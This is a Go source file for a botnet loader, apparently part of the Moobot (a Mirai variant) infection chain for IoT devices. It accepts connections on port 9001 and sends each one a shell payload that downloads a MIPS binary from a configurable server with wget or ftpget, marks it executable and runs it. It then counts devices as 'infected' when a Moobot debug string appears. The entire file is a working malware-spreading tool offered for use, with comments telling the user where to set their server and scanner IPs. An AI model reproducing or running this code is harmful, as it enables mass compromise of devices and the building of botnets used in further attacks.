package main

import (
	"fmt"
	"net"
	"strings"
	"time"
)

// Change Server IP and bin name
var payload string = `
cd /tmp; wget http://urip/LjEZs/mips; ftpget urip mips; chmod 777 mips; ./mips boa.xpon;
`
var dirChange, statusAttempted, statusInfected, echoDropped, statusFailed int

func zeroByte(a []byte) {
	for i := range a {
		a[i] = 0
	}
}

func loaderThread(conn net.Conn) {
	defer conn.Close()
	buf := make([]byte, 512)
	conn.SetWriteDeadline(time.Now().Add(60 * time.Second))

	conn.Write([]byte(payload))

	statusAttempted++
	conn.SetReadDeadline(time.Now().Add(30 * time.Second))
	for {
		le, err := conn.Read(buf)
		if err != nil || le <= 0 {
			break
		}

		if strings.Contains(string(buf), "For God so loved the world") { // Moobot debug message
			statusInfected++
			break
		}
	}

	zeroByte(buf)
	return
}

func main() {

	li, err := net.Listen("tcp", "0.0.0.0:9001") // Change this to scanner IP
	if err != nil {
		return
	}

	var i int = 0
	go func() {
		for {
			fmt.Printf("%d's | Attempted %d | Infected %d\r\n", i, statusAttempted, statusInfected)
			time.Sleep(1 * time.Second)
			i++
		}
	}()

	go func() {
		for {
			conn, err := li.Accept()
			if err != nil {
				break
			}

			go loaderThread(conn)
		}
	}()

	for {
		time.Sleep(1 * time.Second)
	}
}
